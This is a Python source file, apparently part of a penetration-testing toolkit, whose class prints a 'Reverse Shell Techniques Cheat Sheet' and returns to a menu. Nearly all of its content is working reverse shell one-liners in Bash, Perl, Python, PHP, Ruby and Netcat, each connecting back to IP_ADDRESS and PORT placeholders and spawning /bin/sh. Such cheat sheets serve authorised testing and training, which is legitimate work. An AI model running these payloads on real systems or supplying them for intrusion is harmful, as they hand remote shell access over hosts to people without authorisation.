from frontend.banner import Banner


class ReverseShellCheatSheet:
    def __init__(self, callback=None):
        self.print_cheat_sheet()
        self.callback = callback

    def print_cheat_sheet(self):
        Banner()
        print("Reverse Shell Techniques Cheat Sheet:\n")
        print("Bash:")
        print("  bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1")
        print("Perl:")
        print("  perl -e 'use Socket;$i=\"IP_ADDRESS\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
        print("Python:")
        print("  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP_ADDRESS\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        print("PHP:")
        print("  php -r '$sock=fsockopen(\"IP_ADDRESS\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        print("Ruby:")
        print("  ruby -rsocket -e'f=TCPSocket.open(\"IP_ADDRESS\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
        print("Netcat:")
        print("  nc -e /bin/sh IP_ADDRESS PORT")
        print("  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDRESS PORT >/tmp/f")
        input("\nPress Enter to return to cheat sheets menu...")
        self.exit()

    def exit(self):
        if self.callback:
            self.callback(0)
        else:
            print("Exiting...")

if __name__ == "__main__":
    ReverseShellCheatSheet()
